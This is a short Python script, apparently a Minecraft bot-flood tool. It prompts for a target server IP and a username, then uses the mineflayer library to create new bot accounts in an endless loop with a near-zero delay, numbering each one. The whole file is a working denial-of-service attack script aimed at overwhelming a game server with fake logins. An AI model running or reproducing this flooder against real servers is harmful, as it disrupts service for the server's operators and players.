from javascript import require, On
import time

mineflayer = require('mineflayer')

targetIP = input("Server IP: ")
username = input("Username: ")
BotNumber = 1


while True:
    bot = mineflayer.createBot({
        'host': f'{targetIP}',
        'username': f'{username}{BotNumber}',
        'hideErrors': False

    })


    @On(bot, 'login')
    def handle(*args):
        print(f'{username}{BotNumber} joined the server')

    time.sleep(0.00001)
    BotNumber += 1
